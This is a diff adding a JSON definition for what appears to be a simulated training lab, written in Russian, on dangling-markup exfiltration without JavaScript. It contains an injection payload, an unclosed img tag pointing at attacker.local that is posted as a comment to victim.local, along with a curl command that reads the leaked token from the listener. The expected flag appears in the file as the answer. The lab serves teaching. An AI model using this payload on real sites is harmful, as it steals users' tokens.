@@ -1,0 +1,22 @@
+{
+  "id": "web-dangling-markup",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{d4ngl1ng_m4rkup_n0_js}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: dangling markup — эксфильтрация без JavaScript\n\nКомментарии на `victim.local` не экранируются. Оставь «висячий» тег\n(`<img src=\"//attacker/?...`), который поглотит следующий HTML — вместе с\nтокеном — в URL запроса к нашему слушателю. JavaScript не нужен.\n\n1. Оставляем комментарий с dangling-разметкой:\n\n   curl -s https://victim.local/post -d 'comment=\"><img src=\"//attacker.local/?leak='\n\n2. Читаем, что поймал слушатель (флаг там):\n\n   curl -s http://attacker.local/log > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция victim.local и слушателя)",
+      "cases": [
+        { "match": "attacker\\.local/log", "example": "-s http://attacker.local/log", "output": "[attacker] 203.0.113.7 - GET /?leak=nto{d4ngl1ng_m4rkup_n0_js}&lt;/a&gt;\n" },
+        { "match": "comment.*img|img src|<img", "example": "-s https://victim.local/post -d 'comment=\"><img src=\"//attacker.local/?leak='", "output": "Comment posted (awaiting moderation).\n" },
+        { "match": "victim\\.local/post", "example": "-s https://victim.local/post", "output": "<form method=\"post\"><textarea name=\"comment\"></textarea></form>\n" },
+        { "match": "victim\\.local", "example": "-s https://victim.local/", "output": "<!doctype html><title>victim blog</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется victim.local.\n"
+    }
+  }
+}
